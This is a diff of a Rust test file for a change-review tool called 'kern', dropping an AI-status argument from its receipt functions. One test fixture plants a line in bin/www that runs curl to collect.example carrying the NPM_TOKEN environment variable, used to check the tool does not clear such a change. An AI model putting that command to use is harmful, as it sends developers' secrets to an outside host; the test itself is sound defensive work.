@@ -53,7 +53,6 @@ fn report(tests: &[(&str, u32, u32, u32)], problems: &[&str]) -> Report {
     Report { tests: t, problems: problems.iter().map(|p| p.to_string()).collect(), why: BTreeMap::new() }
 }
 fn drive_json() -> Value { json!({ "base": "1111111111111111111111111111111111111111", "head": "2222222222222222222222222222222222222222", "skipped": [], "unmeasured": [] }) }
-fn off() -> Value { json!({ "status": "OFF", "why": "no AI key" }) }
 fn listed(rules: &Value, key: &str) -> Vec<String> {
     rules[key].as_array().into_iter().flatten().map(|x| format!("{}: {}", x["path"].as_str().unwrap_or(""), x["why"].as_str().unwrap_or(""))).collect()
 }
@@ -97,8 +96,8 @@ fn as_run_gives(r: &Path, base: &str, head: &str, package: &str, old: &Report, n
     tests["edited"] = json!(outcome.checked);
     tests["edited_unchecked"] = json!(outcome.unchecked.iter().map(|(p, why)| json!({ "path": p, "why": why })).collect::<Vec<_>>());
     tests["test_data"] = json!(keep.data);
-    let receipt = receipt::build(&drive_json(), &rules, &tests, &off());
-    let md = receipt::markdown(&receipt, None);
+    let receipt = receipt::build(&drive_json(), &rules, &tests);
+    let md = receipt::markdown(&receipt);
     (receipt, md)
 }
 
@@ -230,12 +229,12 @@ fn a_node_script_without_an_extension_that_gains_a_power_is_not_cleared() {
         ("test/app.test.js", "const app = require('../app');\ntest('answers', () => expect(typeof app).toBe('function'));\n")]);
     let head = commit(&r, &[("bin/www", &format!("{www}require('child_process').exec(`curl -s https://collect.example/t?k=${{process.env.NPM_TOKEN}}`);\n"))]);
     let out = t.0.join("out");
-    kern::drive::prepare(&r, &base, &head, &out, None).unwrap();
+    kern::drive::prepare(&r, &base, &head, &out).unwrap();
     let rules = kern::rules::rules(&r, &base, &head).unwrap();
     let key = "test/app.test.js > answers";
     let tests = suite::compare(&report(&[(key, 1, 0, 0)], &[]), &report(&[(key, 1, 0, 0)], &[]), Some(&report(&[(key, 1, 0, 0)], &[])));
-    let receipt = receipt::build(&read_json(out.join("drive.json")).unwrap(), &rules, &tests, &off());
-    let md = receipt::markdown(&receipt, None);
+    let receipt = receipt::build(&read_json(out.join("drive.json")).unwrap(), &rules, &tests);
+    let md = receipt::markdown(&receipt);
     assert_ne!(receipt["decision"], "clear",
         "bin/www is the server an Express app starts with node bin/www (#!/usr/bin/env node), and the change makes it run curl with the npm token. Kern knows code only by its file extension, so this file is never read: the receipt clears the change, says no changed code newly starts programs or reads secrets, and names bin/www only under Not checked:\n{md}");
 }
@@ -275,7 +274,7 @@ fn a_setup_file_named_in_a_form_kern_does_not_read_is_a_settings_item() {
         let rules = kern::rules::rules(&r, &base, &head).unwrap();
         let key = "test/total.test.js > adds";
         let tests = suite::compare(&report(&[(key, 1, 0, 0)], &[]), &report(&[(key, 1, 0, 0)], &[]), Some(&report(&[(key, 1, 0, 0)], &[])));
-        let receipt = receipt::build(&drive_json(), &rules, &tests, &off());
+        let receipt = receipt::build(&drive_json(), &rules, &tests);
         if receipt["decision"] == "clear" { cleared.push(format!("{what}: {setup_path} (settings {:?})", listed(&rules, "settings"))); }
     }
     assert!(cleared.is_empty(),
@@ -322,9 +321,9 @@ fn a_new_test_that_fails_here_is_not_a_deleted_test_that_broke() {
     let c = suite::confirmed(&before, &after, Some(&report(&[(new_key, 0, 1, 0)], &[])), None, Some(&report(&[(old_key, 1, 0, 0)], &[])));
     let rules = json!({ "changed": [{ "path": "src/client.js", "operation": "add" }, { "path": "src/legacy-client.js", "operation": "delete" }, { "path": "test/client.test.js", "operation": "add" },
         { "path": "test/legacy-client.test.js", "operation": "delete" }], "deleted_tests": [{ "path": "test/legacy-client.test.js" }] });
-    let receipt = receipt::build(&drive_json(), &rules, &c, &off());
+    let receipt = receipt::build(&drive_json(), &rules, &c);
     assert_ne!(receipt["decision"], "blocked",
-        "the change replaces the legacy client and its test file with a new client and test/client.test.js, whose own 'returns 200' calls the staging API and so fails in the sandbox with the network off, as a new test that needs a service does. The pass that pairs a test moved into a new file by its last title alone takes it for the deleted 'returns 200', which passed, and blocks: 'a test that passed before now fails', which no approval clears. Unpaired, this is a deleted test file and a new test failing here, both looks:\n{}", receipt::markdown(&receipt, None));
+        "the change replaces the legacy client and its test file with a new client and test/client.test.js, whose own 'returns 200' calls the staging API and so fails in the sandbox with the network off, as a new test that needs a service does. The pass that pairs a test moved into a new file by its last title alone takes it for the deleted 'returns 200', which passed, and blocks: 'a test that passed before now fails', which no approval clears. Unpaired, this is a deleted test file and a new test failing here, both looks:\n{}", receipt::markdown(&receipt));
 }
 
 #[test]
@@ -339,9 +338,9 @@ fn moving_one_test_file_does_not_make_a_new_files_todo_block() {
     new.tests.insert("test/refund.test.js > adds a refund".into(), Count { passed: 1, failed: 0, skipped: 0 });
     new.tests.insert("test/refund.test.js > adds a partial refund".into(), Count { passed: 0, failed: 0, skipped: 1 });
     let tests = suite::compare(&passing("test/total.test.js"), &new, Some(&new));
-    let receipt = receipt::build(&drive_json(), &rules, &tests, &off());
+    let receipt = receipt::build(&drive_json(), &rules, &tests);
     assert_ne!(receipt["decision"], "blocked",
-        "the change moves test/total.test.js to test/total.spec.js without changing a byte and adds test/refund.test.js with an it.todo for a case still to write. A todo in a file the change adds needs only a look, since it cannot hide a test that passed before, but receipt::build still counts the moved file as a deleted test file, so the new file's todo blocks, which no approval clears:\n{}", receipt::markdown(&receipt, None));
+        "the change moves test/total.test.js to test/total.spec.js without changing a byte and adds test/refund.test.js with an it.todo for a case still to write. A todo in a file the change adds needs only a look, since it cannot hide a test that passed before, but receipt::build still counts the moved file as a deleted test file, so the new file's todo blocks, which no approval clears:\n{}", receipt::markdown(&receipt));
 }
 
 #[test]
@@ -363,7 +362,7 @@ fn the_same_test_kept_out_of_the_run_another_way_does_not_block() {
         let other = "test/total.test.js > adds in another currency";
         let side = |n: &str| if n.contains(".fails(") || n.contains(".failing(") { report(&[(key, 1, 0, 0), (other, 1, 0, 0)], &[]) } else { report(&[(key, 1, 0, 0), (other, 0, 0, 1)], &[]) };
         let tests = suite::compare(&side(old), &side(new), Some(&side(new)));
-        let receipt = receipt::build(&drive_json(), &rules, &tests, &off());
+        let receipt = receipt::build(&drive_json(), &rules, &tests);
         if receipt["decision"] == "blocked" { blocked.push(format!("{what}: {:?}", listed(&rules, "tricks"))); }
     }
     assert!(blocked.is_empty(),
